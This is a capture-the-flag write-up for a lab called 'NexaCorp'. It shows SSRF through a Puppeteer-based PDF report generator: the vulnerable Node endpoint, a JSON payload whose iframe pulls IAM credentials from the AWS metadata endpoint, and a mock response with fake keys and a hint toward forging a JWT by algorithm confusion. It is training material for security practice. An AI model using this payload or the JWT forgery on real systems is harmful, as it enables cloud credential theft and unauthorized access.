# FLAG 4: SSRF via PDF Report Generation

[← Back to README](README.md) | [Previous: FLAG 3](FLAG-3-privilege-escalation.md) | [Next: FLAG 5 →](FLAG-5-jwt-confusion.md)

<img width="809" height="141" alt="image" src="https://github.com/user-attachments/assets/28dc2bce-4b95-48a8-ae75-6d719f7c8e6d" />

---

## 🎯 Challenge Summary

| Aspect | Details |
|--------|---------|
| **Vulnerability Type** | Server-Side Request Forgery (SSRF) |
| **Points** | 450 pts |
| **Prerequisite** | Need access_token from FLAG 2 |

---

## 📖 What is SSRF?

SSRF is tricking a server into snooping around places normal users were never meant to see. 👀

---

## 🔍 The NexaCorp Vulnerability

### The Feature: Report Generator

The admin panel has a "Compliance Report Generator" that:
1. Takes an HTML template from user
2. Renders it using Puppeteer (headless Chrome)
3. Converts to PDF
4. Returns PDF file

### The Vulnerability

```javascript
// VULNERABLE CODE
app.post('/api/v2/reports/generate', (req, res) => {
  const { template } = req.body;
  
  // NO SANITIZATION - Direct user input!
  await page.setContent(template);
  
  // During rendering, Puppeteer fetches ALL resources:
  // <img src="..."> → Fetches the image
  // <iframe src="..."> → Fetches the iframe
  // <link href="..."> → Fetches the stylesheet
  // <script src="..."> → Fetches the script
  
  const pdf = await page.pdf();
  res.json({ pdf: pdf.toString('base64') });
});
```
---

## 😈 Exploitation

### Created Postman Request

```
Method: POST
URL: http://nexacorp.ine.local:1337/api/v2/reports/generate
```

---

### Added Headers

```
KEY                VALUE
─────────────────────────────────────────────
Authorization      Bearer [my access_token]
Content-Type       application/json
```

---

### Added a Malicious HTML Template

```
{
  "template": "<html><body><iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role\"></iframe></body></html>"
}
```

**What did I do?:**
- HTML creates an iframe
- iframe src points to AWS metadata endpoint
- Server tries to load it
- Returns AWS credentials

---

### Response

```json
{
  "vault_access": "GRANTED",
  "algorithm_used": "HS256 (algorithm confusion attack successful)",
  "pdf_size_bytes": 16312,
  "rendering_engine": "Chromium (Puppeteer)",
  "rendering_log": [
    {
      "event": "ssrf_request",
      "original_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role",
      "forwarded_to": "http://metadata-mock/latest/meta-data/iam/security-credentials/nexacorp-prod-role",
      "status": 200,
      "content_type": "application/json; charset=utf-8",
      "body": {
        "Code": "Success",
        "LastUpdated": "2026-05-06T21:55:39.285Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "ASIAXNEXACORP2024PROD",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYNEXACORP",
        "Token": "FwoGZXIvYXdzEJr//////////wEaDM4kcnexacorpTOKEN...",
        "Expiration": "2026-05-06T22:55:39.224Z",
        "Role": "nexacorp-prod-role",
        "Flag": "FLAG{bl1nd_ssrf_pdf_r3nd3r_3xf1l}",
        "JWKS_Endpoint": "https://auth.nexacorp.io/.well-known/jwks.json",
        "_hint": "auth.nexacorp.io resolves to the NexaCorp target server. Use the RSA public key from JWKS_Endpoint (substitute auth.nexacorp.io with <TARGET_IP>:1337) with alg=HS256 to forge a super-admin JWT for /api/vault/critical-secrets"
      }
    }
  ],
  "_warning": "Server-side resource fetching detected during PDF rendering (SSRF)."
}
```

FLAG SUCESSFULLY EXTRACTED!
---

[← Back to README](README.md) | [Previous: FLAG 3](FLAG-3-privilege-escalation.md) | [Next: FLAG 5 →](FLAG-5-jwt-confusion.md)
